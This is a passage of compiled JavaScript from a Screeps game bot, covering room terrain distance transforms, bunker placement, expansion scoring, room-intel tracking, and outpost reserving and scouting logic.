    spawnMoarOverlords() {
        let priority;
        if (this.room && this.room.my) {
            if (this.colony.level == 8) {
                priority = OverlordPriority.ownedRoom.mineralRCL8;
            }
            else {
                priority = OverlordPriority.ownedRoom.mineral;
            }
        }
        else {
            priority = OverlordPriority.remoteSKRoom.mineral;
        }
        this.overlords.extract = new ExtractorOverlord(this, priority);
    }
    init() {
    }
    run() {
        if (this.colony.level < 6) {
            log.notify(`Removing extraction directive in ${this.pos.roomName}: room RCL insufficient.`);
            this.remove();
        }
    }
};
DirectiveExtract.directiveName = 'extract';
DirectiveExtract.color = COLOR_YELLOW;
DirectiveExtract.secondaryColor = COLOR_CYAN;
DirectiveExtract = __decorate([
    profile
], DirectiveExtract);

function applyDistanceTransform(foregroundPixels, oob = 255) {
    const dist = foregroundPixels;
    // Variables to represent the 3x3 neighborhood of a pixel.
    let UL, U, UR;
    let L, mid, R;
    let BL, B, BR;
    let x, y, value;
    for (y = 0; y < 50; ++y) {
        for (x = 0; x < 50; ++x) {
            if (foregroundPixels.get(x, y) !== 0) {
                UL = dist.get(x - 1, y - 1);
                U = dist.get(x, y - 1);
                UR = dist.get(x + 1, y - 1);
                L = dist.get(x - 1, y);
                if (y == 0) {
                    UL = oob;
                    U = oob;
                    UR = oob;
                }
                if (x == 0) {
                    UL = oob;
                    L = oob;
                }
                if (x == 49) {
                    UR = oob;
                }
                dist.set(x, y, Math.min(UL, U, UR, L, 254) + 1);
            }
        }
    }
    for (y = 49; y >= 0; --y) {
        for (x = 49; x >= 0; --x) {
            mid = dist.get(x, y);
            R = dist.get(x + 1, y);
            BL = dist.get(x - 1, y + 1);
            B = dist.get(x, y + 1);
            BR = dist.get(x + 1, y + 1);
            if (y == 49) {
                BL = oob;
                B = oob;
                BR = oob;
            }
            if (x == 49) {
                R = oob;
                BR = oob;
            }
            if (x == 0) {
                BL = oob;
            }
            value = Math.min(mid, R + 1, BL + 1, B + 1, BR + 1);
            dist.set(x, y, value);
        }
    }
    return dist;
}
// Compute a cost matrix for walkable pixels in a room
function walkablePixelsForRoom(roomName) {
    const costMatrix = new PathFinder.CostMatrix();
    const terrain = Game.map.getRoomTerrain(roomName);
    for (let y = 0; y < 50; ++y) {
        for (let x = 0; x < 50; ++x) {
            if (terrain.get(x, y) != TERRAIN_MASK_WALL) {
                costMatrix.set(x, y, 1);
            }
        }
    }
    return costMatrix;
}
function wallOrAdjacentToExit(x, y, roomName) {
    const terrain = Game.map.getRoomTerrain(roomName);
    if (1 < x && x < 48 && 1 < y && y < 48) {
        return terrain.get(x, y) == TERRAIN_MASK_WALL;
    }
    if (0 == x || 0 == y || 49 == x || 49 == y) {
        return true;
    }
    if (terrain.get(x, y) == TERRAIN_MASK_WALL) {
        return true;
    }
    // If we've reached here then position is a walkable neighbor to an exit tile
    let A, B, C;
    if (x == 1) {
        A = terrain.get(0, y - 1);
        B = terrain.get(0, y);
        C = terrain.get(0, y + 1);
    }
    else if (x == 48) {
        A = terrain.get(49, y - 1);
        B = terrain.get(49, y);
        C = terrain.get(49, y + 1);
    }
    if (y == 1) {
        A = terrain.get(x - 1, 0);
        B = terrain.get(x, 0);
        C = terrain.get(x + 1, 0);
    }
    else if (y == 48) {
        A = terrain.get(x - 1, 49);
        B = terrain.get(x, 49);
        C = terrain.get(x + 1, 49);
    }
    return !(A == TERRAIN_MASK_WALL && B == TERRAIN_MASK_WALL && C == TERRAIN_MASK_WALL);
}
// Compute positions where you can build movement-blocking structures in a room
function blockablePixelsForRoom(roomName) {
    const costMatrix = new PathFinder.CostMatrix();
    for (let y = 0; y < 50; ++y) {
        for (let x = 0; x < 50; ++x) {
            if (!wallOrAdjacentToExit(x, y, roomName)) {
                costMatrix.set(x, y, 1);
            }
        }
    }
    return costMatrix;
}
// Visualize a given costMatrix globally
function displayCostMatrix(costMatrix, color = '#ff0000') {
    const vis = new RoomVisual();
    let max = 1;
    for (let y = 0; y < 50; ++y) {
        for (let x = 0; x < 50; ++x) {
            max = Math.max(max, costMatrix.get(x, y));
        }
    }
    for (let y = 0; y < 50; ++y) {
        for (let x = 0; x < 50; ++x) {
            const value = costMatrix.get(x, y);
            if (value > 0) {
                vis.circle(x, y, { radius: costMatrix.get(x, y) / max / 2, fill: color });
            }
        }
    }
}
function testDistanceTransform(roomName = 'sim') {
    const dt = applyDistanceTransform(walkablePixelsForRoom(roomName));
    displayCostMatrix(dt);
}
function distanceTransform(roomName) {
    return applyDistanceTransform(walkablePixelsForRoom(roomName));
}

const MAX_SAMPLE = 10;
const MAX_TOTAL_PATH_LENGTH = 25 * 3;
let BasePlanner = class BasePlanner {
    static getBunkerLocation(room, visualize = true) {
        const colony = Overmind.colonies[room.name];
        if (colony && colony.bunker && colony.bunker.anchor) {
            return colony.bunker.anchor;
        }
        let allowableLocations = this.getAllowableBunkerLocations(room, visualize);
        if (allowableLocations.length > MAX_SAMPLE) {
            allowableLocations = _.sample(allowableLocations, MAX_SAMPLE);
        }
        const minimizePathLengthTo = _.map(_.compact([...room.sources, room.controller]), obj => obj.pos);
        const totalPathLength = function (anchor) {
            let totalDistance = 0;
            for (const pos of minimizePathLengthTo) {
                const ret = Pathing.findShortestPath(anchor, pos, { ignoreStructures: true });
                if (!ret.incomplete) {
                    totalDistance += ret.path.length;
                }
                else {
                    totalDistance += Infinity;
                }
            }
            return totalDistance;
        };
        const bestAnchor = minBy(allowableLocations, pos => totalPathLength(pos));
        if (bestAnchor && totalPathLength(bestAnchor) <= MAX_TOTAL_PATH_LENGTH) {
            return bestAnchor;
        }
    }
    static getAllowableBunkerLocations(room, visualize = true) {
        let allowableLocations = this.getNonIntersectingBunkerLocations(room.name, visualize);
        if (allowableLocations.length > MAX_SAMPLE) {
            allowableLocations = _.sample(allowableLocations, MAX_SAMPLE);
        }
        // Filter intersection with controller
        if (!room.controller)
            return [];
        allowableLocations = _.filter(allowableLocations, anchor => !this.bunkerIntersectsWith(anchor, room.controller.pos, 3));
        // Filter intersection with miningSites
        const sitesAndMineral = _.map(_.compact([...room.sources, room.mineral]), obj => obj.pos);
        allowableLocations = _.filter(allowableLocations, anchor => !_.any(sitesAndMineral, pos => this.bunkerIntersectsWith(anchor, pos, 1)));
        if (visualize) {
            const vis = room.visual;
            for (const pos of allowableLocations) {
                vis.circle(pos.x, pos.y, { fill: 'purple' });
            }
        }
        return allowableLocations;
    }
    static getNonIntersectingBunkerLocations(roomName, visualize = true) {
        const dt = distanceTransform(roomName);
        const coords = [];
        let x, y;
        for (y of _.range(BUNKER_RADIUS + 2, 50 - (BUNKER_RADIUS + 2))) {
            for (x of _.range(BUNKER_RADIUS + 2, 50 - (BUNKER_RADIUS + 2))) {
                if (dt.get(x, y) >= BUNKER_RADIUS + 1) {
                    // If it fits, I sits
                    coords.push({ x, y });
                }
                else if (dt.get(x, y) >= (BUNKER_RADIUS - 1) && !this.terrainIntersectsWithBunker({ x, y }, dt)) {
                    // If it might not fits, check that it fits before I sits
                    coords.push({ x, y });
                }
            }
        }
        if (visualize) {
            const vis = new RoomVisual(roomName);
            for (const coord of coords) {
                vis.text(dt.get(coord.x, coord.y).toString(), coord.x, coord.y);
            }
        }
        return _.map(coords, coord => new RoomPosition(coord.x, coord.y, roomName));
    }
    static terrainIntersectsWithBunker(anchor, distanceMatrix) {
        const dx = anchor.x - bunkerLayout.data.anchor.x;
        const dy = anchor.y - bunkerLayout.data.anchor.y;
        const bunkerCoordsAtAnchor = _.map(allBunkerCoords[8], function (coord) {
            return { x: coord.x + dx, y: coord.y + dy };
        });
        return _.any(bunkerCoordsAtAnchor, coord => distanceMatrix.get(coord.x, coord.y) == 0);
    }
    static bunkerIntersectsWith(anchor, obstacle, padding = 1) {
        const dx = bunkerLayout.data.anchor.x - anchor.x;
        const dy = bunkerLayout.data.anchor.y - anchor.y;
        let x, y;
        for (x of _.range(obstacle.x + dx - padding, obstacle.x + dx + padding + 1)) {
            for (y of _.range(obstacle.y + dy - padding, obstacle.y + dy + padding + 1)) {
                if (bunkerCoordLookup[8][coordName({ x, y })]) {
                    return true;
                }
            }
        }
        return false;
    }
};
BasePlanner = __decorate([
    profile
], BasePlanner);

const EXPANSION_EVALUATION_FREQ = 500;
const MIN_EXPANSION_DISTANCE = 2;
let ExpansionEvaluator = class ExpansionEvaluator {
    static refreshExpansionData(colony) {
        // This only gets run once per colony
        if (_.keys(colony.memory.expansionData.possibleExpansions).length == 0
            || Game.time > colony.memory.expansionData.expiration) {
            // Generate a list of rooms which can possibly be settled in
            const nearbyRooms = Cartographer.recursiveRoomSearch(colony.room.name, 5);
            let possibleExpansions = [];
            for (const depth in nearbyRooms) {
                if (parseInt(depth, 10) <= MIN_EXPANSION_DISTANCE)
                    continue;
                possibleExpansions = possibleExpansions.concat(nearbyRooms[depth]);
            }
            for (const roomName of possibleExpansions) {
                if (Cartographer.roomType(roomName) == ROOMTYPE_CONTROLLER) {
                    colony.memory.expansionData.possibleExpansions[roomName] = true;
                }
            }
        }
        // This gets run whenever function is called
        for (const roomName in colony.memory.expansionData.possibleExpansions) {
            if (colony.memory.expansionData.possibleExpansions[roomName] == true) {
                if (Memory.rooms[roomName]) {
                    const expansionData = Memory.rooms[roomName]["e" /* EXPANSION_DATA */];
                    if (expansionData == false) {
                        colony.memory.expansionData.possibleExpansions[roomName] = false;
                    }
                    else if (expansionData && expansionData.score) {
                        colony.memory.expansionData.possibleExpansions[roomName] = expansionData.score;
                    }
                }
            }
        }
    }
    // Compute the total score for a room
    static computeExpansionData(room, verbose = false) {
        if (verbose)
            log.info(`Computing score for ${room.print}...`);
        if (!room.controller) {
            room.memory["e" /* EXPANSION_DATA */] = false;
            return false;
        }
        // compute possible outposts (includes host room)
        const possibleOutposts = Cartographer.findRoomsInRange(room.name, 2);
        // find source positions
        const outpostSourcePositions = {};
        for (const roomName of possibleOutposts) {
            if (Cartographer.roomType(roomName) == ROOMTYPE_ALLEY)
                continue;
            const roomMemory = Memory.rooms[roomName];
            if (!roomMemory || !roomMemory["s" /* SOURCES */]) {
                if (verbose)
                    log.info(`No memory of neighbor: ${roomName}. Aborting score calculation!`);
                return false;
            }
            outpostSourcePositions[roomName] = _.map(roomMemory["s" /* SOURCES */], obj => derefCoords(obj.c, roomName));
        }
        // compute a possible bunker position
        const bunkerLocation = BasePlanner.getBunkerLocation(room, false);
        if (!bunkerLocation) {
            room.memory["e" /* EXPANSION_DATA */] = false;
            log.info(`Room ${room.name} is uninhabitable because a bunker can't be built here!`);
            return false;
        }
        // evaluate energy contribution and compute outpost scores
        if (verbose)
            log.info(`Origin: ${bunkerLocation.print}`);
        const outpostScores = {};
        for (const roomName in outpostSourcePositions) {
            if (verbose)
                log.info(`Analyzing neighbor ${roomName}`);
            const sourcePositions = outpostSourcePositions[roomName];
            let valid = true;
            const roomType = Cartographer.roomType(roomName);
            let energyPerSource = SOURCE_ENERGY_CAPACITY;
            if (roomType == ROOMTYPE_SOURCEKEEPER) {
                energyPerSource = 0.6 * SOURCE_ENERGY_KEEPER_CAPACITY; // don't favor SK rooms too heavily -- more CPU
            }
            else if (roomType == ROOMTYPE_CORE) {
                energyPerSource = SOURCE_ENERGY_KEEPER_CAPACITY;
            }
            let roomScore = 0;
            for (const position of sourcePositions) {
                const msg = verbose ? `Computing distance from ${bunkerLocation.print} to ${position.print}... ` : '';
                const ret = Pathing.findShortestPath(bunkerLocation, position, { ignoreStructures: true, allowHostile: true });
                if (ret.incomplete || ret.path.length > Colony.settings.maxSourceDistance) {
                    if (verbose)
                        log.info(msg + 'incomplete path!');
                    valid = false;
                    break;
                }
                if (verbose)
                    log.info(msg + ret.path.length);
                const offset = 25; // prevents over-sensitivity to very close sources
                roomScore += energyPerSource / (ret.path.length + offset);
            }
            if (valid) {
                outpostScores[roomName] = Math.floor(roomScore);
            }
        }
        // Compute the total score of the room as the maximum energy score of max number of sources harvestable
        let totalScore = 0;
        let sourceCount = 0;
        const roomsByScore = _.sortBy(_.keys(outpostScores), roomName => -1 * outpostScores[roomName]);
        for (const roomName of roomsByScore) {
            if (sourceCount > Colony.settings.remoteSourcesByLevel[8])
                break;
            const factor = roomName == room.name ? 2 : 1; // weight owned room scores more heavily
            totalScore += outpostScores[roomName];
            sourceCount += outpostSourcePositions[roomName].length;
        }
        totalScore = Math.floor(totalScore);
        if (verbose)
            log.info(`Score: ${totalScore}`);
        if (!room.memory["e" /* EXPANSION_DATA */] ||
            totalScore > room.memory["e" /* EXPANSION_DATA */].score) {
            room.memory["e" /* EXPANSION_DATA */] = {
                score: totalScore,
                bunkerAnchor: bunkerLocation.coordName,
                outposts: outpostScores,
            };
        }
        return true;
    }
};
ExpansionEvaluator = __decorate([
    profile
], ExpansionEvaluator);

// Room intel - provides information related to room structure and occupation
const RECACHE_TIME = 2500;
const OWNED_RECACHE_TIME = 1000;
const ROOM_CREEP_HISTORY_TICKS = 25;
const SCORE_RECALC_PROB = 0.05;
const FALSE_SCORE_RECALC_PROB = 0.01;
const RoomIntelMemoryDefaults = {};
let RoomIntel = class RoomIntel {
    /**
     * Mark a room as being visible this tick
     */
    static markVisible(room) {
        room.memory["T" /* TICK */] = Game.time;
    }
    /**
     * Returns the last tick at which the room was visible, or -100
     */
    static lastVisible(roomName) {
        if (Memory.rooms[roomName]) {
            return Memory.rooms[roomName]["T" /* TICK */] || -100;
        }
        else {
            return -100;
        }
    }
    /**
     * Records all info for permanent room objects, e.g. sources, controllers, etc.
     */
    static recordPermanentObjects(room) {
        const savedSources = [];
        for (const source of room.sources) {
            const container = source.pos.findClosestByLimitedRange(room.containers, 2);
            savedSources.push({
                c: source.pos.coordName,
                contnr: container ? container.pos.coordName : undefined
            });
        }
        room.memory["s" /* SOURCES */] = savedSources;
        room.memory["c" /* CONTROLLER */] = room.controller ? {
            c: room.controller.pos.coordName,
            ["l" /* LEVEL */]: room.controller.level,
            ["o" /* OWNER */]: room.controller.owner ? room.controller.owner.username : undefined,
            ["r" /* RESERVATION */]: room.controller.reservation ?
                {
                    ["u" /* RES_USERNAME */]: room.controller.reservation.username,
                    ["t" /* RES_TICKSTOEND */]: room.controller.reservation.ticksToEnd,
                } : undefined,
            ["s" /* SAFEMODE */]: room.controller.safeMode,
            ["sa" /* SAFEMODE_AVAILABLE */]: room.controller.safeModeAvailable,
            ["sc" /* SAFEMODE_COOLDOWN */]: room.controller.safeModeCooldown,
            ["p" /* PROGRESS */]: room.controller.progress,
            ["pt" /* PROGRESS_TOTAL */]: room.controller.progressTotal
        } : undefined;
        room.memory["m" /* MINERAL */] = room.mineral ? {
            c: room.mineral.pos.coordName,
            ["d" /* DENSITY */]: room.mineral.density,
            ["t" /* MINERALTYPE */]: room.mineral.mineralType
        } : undefined;
        room.memory["k" /* SKLAIRS */] = _.map(room.keeperLairs, lair => {
            return { c: lair.pos.coordName };
        });
        room.memory["pr" /* PORTALS */] = _.map(room.portals, portal => {
            const dest = portal.destination instanceof RoomPosition ? portal.destination.name
                : portal.destination;
            const expiration = portal.ticksToDecay != undefined ? Game.time + portal.ticksToDecay : Game.time + 1e6;
            return { c: portal.pos.coordName, dest: dest, ["X" /* EXPIRATION */]: expiration };
        });
        if (room.controller && room.controller.owner) {
            room.memory["i" /* IMPORTANT_STRUCTURES */] = {
                ["t" /* TOWERS */]: _.map(room.towers, t => t.pos.coordName),
                ["sp" /* SPAWNS */]: _.map(room.spawns, s => s.pos.coordName),
                ["s" /* STORAGE */]: room.storage ? room.storage.pos.coordName : undefined,
                ["e" /* TERMINAL */]: room.terminal ? room.terminal.pos.coordName : undefined,
                ["w" /* WALLS */]: _.map(room.walls, w => w.pos.coordName),
                ["r" /* RAMPARTS */]: _.map(room.ramparts, r => r.pos.coordName),
            };
        }
        else {
            room.memory["i" /* IMPORTANT_STRUCTURES */] = undefined;
        }
        room.memory["T" /* TICK */] = Game.time;
    }
    /**
     * Update time-sensitive reservation and safemode info
     */
    static recordControllerInfo(controller) {
        const savedController = controller.room.memory["c" /* CONTROLLER */];
        if (savedController) {
            savedController["r" /* RESERVATION */] = controller.reservation ? {
                ["u" /* RES_USERNAME */]: controller.reservation.username,
                ["t" /* RES_TICKSTOEND */]: controller.reservation.ticksToEnd,
            } : undefined;
            savedController["s" /* SAFEMODE */] = controller.safeMode;
            savedController["sc" /* SAFEMODE_COOLDOWN */] = controller.safeModeCooldown;
        }
    }
    static inSafeMode(roomName) {
        if (!!Memory.rooms[roomName] && !!Memory.rooms[roomName]["c" /* CONTROLLER */]) {
            const safemode = Memory.rooms[roomName]["c" /* CONTROLLER */]["s" /* SAFEMODE */];
            const tick = Memory.rooms[roomName]["X" /* EXPIRATION */];
            if (safemode && tick) {
                return Game.time < tick + safemode;
            }
        }
        return false;
    }
    static safeModeCooldown(roomName) {
        if (Memory.rooms[roomName] && Memory.rooms[roomName]["c" /* CONTROLLER */] &&
            Memory.rooms[roomName]["c" /* CONTROLLER */]["sc" /* SAFEMODE_COOLDOWN */]) {
            const smcooldown = Memory.rooms[roomName]["c" /* CONTROLLER */]["sc" /* SAFEMODE_COOLDOWN */];
            const tick = Memory.rooms[roomName]["X" /* EXPIRATION */];
            if (smcooldown && tick) {
                return smcooldown - (Game.time - tick);
            }
        }
    }
    static recomputeScoreIfNecessary(room) {
        if (room.memory["e" /* EXPANSION_DATA */] == false) { // room is uninhabitable or owned
            if (Math.random() < FALSE_SCORE_RECALC_PROB) {
                // false scores get evaluated very occasionally
                return ExpansionEvaluator.computeExpansionData(room);
            }
        }
        else { // if the room is not uninhabitable
            if (!room.memory["e" /* EXPANSION_DATA */] || Math.random() < SCORE_RECALC_PROB) {
                // recompute some of the time
                return ExpansionEvaluator.computeExpansionData(room);
            }
        }
        return false;
    }
    static updateInvasionData(room) {
        if (!room.memory["v" /* INVASION_DATA */]) {
            room.memory["v" /* INVASION_DATA */] = {
                harvested: 0,
                lastSeen: 0,
            };
        }
        const sources = room.sources;
        const invasionData = room.memory["v" /* INVASION_DATA */];
        for (const source of sources) {
            if (source.ticksToRegeneration == 1) {
                invasionData.harvested += source.energyCapacity - source.energy;
            }
        }
        if (room.invaders.length > 0) {
            invasionData.harvested = 0;
            invasionData.lastSeen = Game.time;
        }
    }
    static updateHarvestData(room) {
        if (!room.memory["h" /* HARVEST */]) {
            room.memory["h" /* HARVEST */] = {
                ["a" /* AMOUNT */]: 0,
                ["D" /* AVG10K */]: _.sum(room.sources, s => s.energyCapacity / ENERGY_REGEN_TIME),
                ["H" /* AVG100K */]: _.sum(room.sources, s => s.energyCapacity / ENERGY_REGEN_TIME),
                ["M" /* AVG1M */]: _.sum(room.sources, s => s.energyCapacity / ENERGY_REGEN_TIME),
                ["T" /* TICK */]: Game.time,
            };
        }
        const harvest = room.memory["h" /* HARVEST */];
        for (const source of room.sources) { // TODO: this implicitly assumes all energy is harvested by me
            if (source.ticksToRegeneration == 1) {
                const dEnergy = source.energyCapacity - source.energy;
                const dTime = Game.time - harvest["T" /* TICK */] + 1; // +1 to avoid division by zero errors
                harvest["a" /* AMOUNT */] += dEnergy;
                harvest["D" /* AVG10K */] = +(irregularExponentialMovingAverage(dEnergy / dTime, harvest["D" /* AVG10K */], dTime, 10000)).toFixed(7);
                harvest["H" /* AVG100K */] = +(irregularExponentialMovingAverage(dEnergy / dTime, harvest["D" /* AVG10K */], dTime, 100000)).toFixed(7);
                harvest["M" /* AVG1M */] = +(irregularExponentialMovingAverage(dEnergy / dTime, harvest["D" /* AVG10K */], dTime, 1000000)).toFixed(7);
                harvest["T" /* TICK */] = Game.time;
            }
        }
    }
    static updateCasualtyData(room) {
        if (!room.memory["d" /* CASUALTIES */]) {
            room.memory["d" /* CASUALTIES */] = {
                cost: {
                    ["a" /* AMOUNT */]: 0,
                    ["D" /* AVG10K */]: 0,
                    ["H" /* AVG100K */]: 0,
                    ["M" /* AVG1M */]: 0,
                    ["T" /* TICK */]: Game.time,
                }
            };
        }
        const casualtiesCost = room.memory["d" /* CASUALTIES */].cost;
        for (const tombstone of room.tombstones) {
            if (tombstone.ticksToDecay == 1) {
                // record any casualties, which are my creeps which died prematurely
                if ((tombstone.creep.ticksToLive || 0) > 1 && tombstone.creep.owner.username == MY_USERNAME
                    && isCreep(tombstone.creep)) {
                    const body = _.map(tombstone.creep.body, part => part.type);
                    const lifetime = body.includes(CLAIM) ? CREEP_CLAIM_LIFE_TIME : CREEP_LIFE_TIME;
                    const dCost = bodyCost(body) * (tombstone.creep.ticksToLive || 0) / lifetime;
                    const dTime = Game.time - casualtiesCost["T" /* TICK */] + 1;
                    casualtiesCost["a" /* AMOUNT */] += dCost;
                    casualtiesCost["D" /* AVG10K */] = +(irregularExponentialMovingAverage(dCost / dTime, casualtiesCost["D" /* AVG10K */], dTime, 10000)).toFixed(7);
                    casualtiesCost["H" /* AVG100K */] = +(irregularExponentialMovingAverage(dCost / dTime, casualtiesCost["H" /* AVG100K */], dTime, 100000)).toFixed(7);
                    casualtiesCost["M" /* AVG1M */] = +(irregularExponentialMovingAverage(dCost / dTime, casualtiesCost["M" /* AVG1M */], dTime, 1000000)).toFixed(7);
                    casualtiesCost["T" /* TICK */] = Game.time;
                }
            }
        }
    }
    /**
     * Get the pos a creep was in on the previous tick
     */
    static getPreviousPos(creep) {
        if (creep.room.memory["p" /* PREV_POSITIONS */] && creep.room.memory["p" /* PREV_POSITIONS */][creep.id]) {
            return derefRoomPosition(creep.room.memory["p" /* PREV_POSITIONS */][creep.id]);
        }
        else {
            return creep.pos; // no data
        }
    }
    static recordCreepPositions(room) {
        room.memory["p" /* PREV_POSITIONS */] = {};
        for (const creep of room.find(FIND_CREEPS)) {
            room.memory["p" /* PREV_POSITIONS */][creep.id] = creep.pos;
        }
    }
    static recordCreepOccupancies(room) {
        if (!room.memory["cr" /* CREEPS_IN_ROOM */]) {
            room.memory["cr" /* CREEPS_IN_ROOM */] = {};
        }
        const creepsInRoom = room.memory["cr" /* CREEPS_IN_ROOM */];
        for (const tick in creepsInRoom) {
            if (parseInt(tick, 10) < Game.time - ROOM_CREEP_HISTORY_TICKS) {
                delete creepsInRoom[tick];
            }
        }
        creepsInRoom[Game.time] = _.map(room.hostiles, creep => creep.name);
    }
    static recordSafety(room) {
        if (!room.memory["f" /* SAFETY */]) {
            room.memory["f" /* SAFETY */] = {
                safeFor: 0,
                unsafeFor: 0,
                safety1k: 1,
                safety10k: 1,
                tick: Game.time
            };
        }
        let safety;
        const safetyData = room.memory["f" /* SAFETY */];
        if (room.dangerousHostiles.length > 0) {
            safetyData.safeFor = 0;
            safetyData.unsafeFor += 1;
            safety = 0;
        }
        else {
            safetyData.safeFor += 1;
            safetyData.unsafeFor = 0;
            safety = 1;
        }
        // Compute rolling averages
        const dTime = Game.time - safetyData.tick;
        safetyData.safety1k = +(irregularExponentialMovingAverage(safety, safetyData.safety1k, dTime, 1000)).toFixed(5);
        safetyData.safety10k = +(irregularExponentialMovingAverage(safety, safetyData.safety10k, dTime, 10000)).toFixed(5);
        safetyData.tick = Game.time;
    }
    static getSafetyData(roomName) {
        if (!Memory.rooms[roomName]) {
            Memory.rooms[roomName] = {};
        }
        if (!Memory.rooms[roomName]["f" /* SAFETY */]) {
            Memory.rooms[roomName]["f" /* SAFETY */] = {
                safeFor: 0,
                unsafeFor: 0,
                safety1k: 1,
                safety10k: 1,
                tick: Game.time
            };
        }
        return Memory.rooms[roomName]["f" /* SAFETY */];
    }
    static isInvasionLikely(room) {
        const data = room.memory["v" /* INVASION_DATA */];
        if (!data)
            return false;
        if (data.lastSeen > 20000) { // maybe room is surrounded by owned/reserved rooms and invasions aren't possible
            return false;
        }
        switch (room.sources.length) {
            case 1:
                return data.harvested > 90000;
            case 2:
                return data.harvested > 75000;
            case 3:
                return data.harvested > 65000;
            default: // shouldn't ever get here
                return false;
        }
    }
    static roomOwnedBy(roomName) {
        if (Memory.rooms[roomName] && Memory.rooms[roomName]["c" /* CONTROLLER */] &&
            Memory.rooms[roomName]["c" /* CONTROLLER */]["o" /* OWNER */]) {
            if (Game.time - (Memory.rooms[roomName]["T" /* TICK */] || 0) < 25000) { // ownership expires after 25k ticks
                return Memory.rooms[roomName]["c" /* CONTROLLER */]["o" /* OWNER */];
            }
        }
    }
    static roomReservedBy(roomName) {
        if (Memory.rooms[roomName] && Memory.rooms[roomName]["c" /* CONTROLLER */] &&
            Memory.rooms[roomName]["c" /* CONTROLLER */]["r" /* RESERVATION */]) {
            if (Game.time - (Memory.rooms[roomName]["T" /* TICK */] || 0) < 10000) { // reservation expires after 10k ticks
                return Memory.rooms[roomName]["c" /* CONTROLLER */]["r" /* RESERVATION */]["u" /* RES_USERNAME */];
            }
        }
    }
    static roomReservationRemaining(roomName) {
        if (Memory.rooms[roomName] && Memory.rooms[roomName]["c" /* CONTROLLER */] &&
            Memory.rooms[roomName]["c" /* CONTROLLER */]["r" /* RESERVATION */]) {
            const ticksToEnd = Memory.rooms[roomName]["c" /* CONTROLLER */]["r" /* RESERVATION */]["t" /* RES_TICKSTOEND */];
            const timeSinceLastSeen = Game.time - (Memory.rooms[roomName]["T" /* TICK */] || 0);
            return ticksToEnd - timeSinceLastSeen;
        }
        return 0;
    }
    static run() {
        let alreadyComputedScore = false;
        for (const name in Game.rooms) {
            const room = Game.rooms[name];
            this.markVisible(room);
            this.recordSafety(room);
            // Track invasion data, harvesting, and casualties for all colony rooms and outposts
            if (Overmind.colonyMap[room.name]) { // if it is an owned or outpost room
                this.updateInvasionData(room);
                this.updateHarvestData(room);
                this.updateCasualtyData(room);
            }
            // Record previous creep positions if needed (RoomIntel.run() is executed at end of each tick)
            if (room.hostiles.length > 0) {
                this.recordCreepPositions(room);
                if (room.my) {
                    this.recordCreepOccupancies(room);
                }
            }
            // Record location of permanent objects in room and recompute score as needed
            if (Game.time >= (room.memory["X" /* EXPIRATION */] || 0)) {
                this.recordPermanentObjects(room);
                if (!alreadyComputedScore) {
                    alreadyComputedScore = this.recomputeScoreIfNecessary(room);
                }
                // Refresh cache
                const recacheTime = room.owner ? OWNED_RECACHE_TIME : RECACHE_TIME;
                room.memory["X" /* EXPIRATION */] = getCacheExpiration(recacheTime, 250);
            }
            if (room.controller && Game.time % 5 == 0) {
                this.recordControllerInfo(room.controller);
            }
        }
    }
};
RoomIntel = __decorate([
    profile
], RoomIntel);
// For debugging purposes
global.RoomIntel = RoomIntel;

/**
 * Spawns reservers to reserve an outpost room
 */
let ReservingOverlord = class ReservingOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.remoteRoom.reserve) {
        super(directive, 'reserve', priority);
        // Change priority to operate per-outpost
        this.priority += this.outpostIndex * OverlordPriority.remoteRoom.roomIncrement;
        this.reserveBuffer = 2000;
        this.reservers = this.zerg(Roles.claim);
    }
    init() {
        let amount = 0;
        if (this.room) {
            if (this.room.controller.needsReserving(this.reserveBuffer)) {
                amount = 1;
            }
        }
        else if (RoomIntel.roomReservedBy(this.pos.roomName) == MY_USERNAME &&
            RoomIntel.roomReservationRemaining(this.pos.roomName) < 1000) {
            amount = 1;
        }
        this.wishlist(amount, Setups.infestors.reserve);
    }
    handleReserver(reserver) {
        if (reserver.room == this.room && !reserver.pos.isEdge) {
            // If reserver is in the room and not on exit tile
            if (!this.room.controller.signedByMe) {
                // Takes care of an edge case where planned newbie zone signs prevents signing until room is reserved
                if (!this.room.my && this.room.controller.signedByScreeps) {
                    reserver.task = Tasks.reserve(this.room.controller);
                }
                else {
                    reserver.task = Tasks.signController(this.room.controller);
                }
            }
            else {
                reserver.task = Tasks.reserve(this.room.controller);
            }
        }
        else {
            // reserver.task = Tasks.goTo(this.pos);
            reserver.goTo(this.pos);
        }
    }
    run() {
        this.autoRun(this.reservers, reserver => this.handleReserver(reserver));
    }
};
ReservingOverlord = __decorate([
    profile
], ReservingOverlord);

/**
 * Sends out a stationary scout, which travels to a waypoint and remains there indefinitely
 */
let StationaryScoutOverlord = class StationaryScoutOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.scouting.stationary) {
        super(directive, 'scout', priority);
        this.scouts = this.zerg(Roles.scout, { notifyWhenAttacked: false });
    }
    init() {
        this.wishlist(1, Setups.scout);
    }
    run() {
        for (const scout of this.scouts) {
            if (!(scout.pos.inRangeTo(this.pos, 3) && !scout.pos.isEdge)) {
                scout.goTo(this.pos, { range: 3 });
            }
        }
    }
};
StationaryScoutOverlord = __decorate([
    profile
], StationaryScoutOverlord);

var DirectiveOutpost_1;
/**
 * Claims a new room and incubates it from the nearest (or specified) colony
 */
let DirectiveOutpost = DirectiveOutpost_1 = class DirectiveOutpost extends Directive {
    spawnMoarOverlords() {
        if (this.colony.level >= DirectiveOutpost_1.settings.canSpawnReserversAtRCL) {
            if (Cartographer.roomType(this.pos.roomName) == ROOMTYPE_CONTROLLER) {
                this.overlords.reserve = new ReservingOverlord(this);
            }
        }
        else {
            this.overlords.scout = new StationaryScoutOverlord(this);
        }
    }
    init() {
    }
    run() {
        if (RoomIntel.roomOwnedBy(this.pos.roomName)) {
            log.warning(`Removing ${this.print} since room is owned!`);
            this.remove();
        }
        if (Game.time % 10 == 3 && this.room && this.room.controller
            && !this.pos.isEqualTo(this.room.controller.pos) && !this.memory.setPosition) {
            this.setPosition(this.room.controller.pos);
        }
    }
};
DirectiveOutpost.directiveName = 'outpost';
DirectiveOutpost.color = COLOR_PURPLE;
DirectiveOutpost.secondaryColor = COLOR_PURPLE;
DirectiveOutpost.settings = {
    canSpawnReserversAtRCL: 3,
};
DirectiveOutpost = DirectiveOutpost_1 = __decorate([
    profile
], DirectiveOutpost);

var MiningOverlord_1;
const StandardMinerSetupCost = bodyCost(Setups.drones.miners.standard.generateBody(Infinity));
const DoubleMinerSetupCost = bodyCost(Setups.drones.miners.double.generateBody(Infinity));
const BUILD_OUTPUT_FREQUENCY$1 = 15;
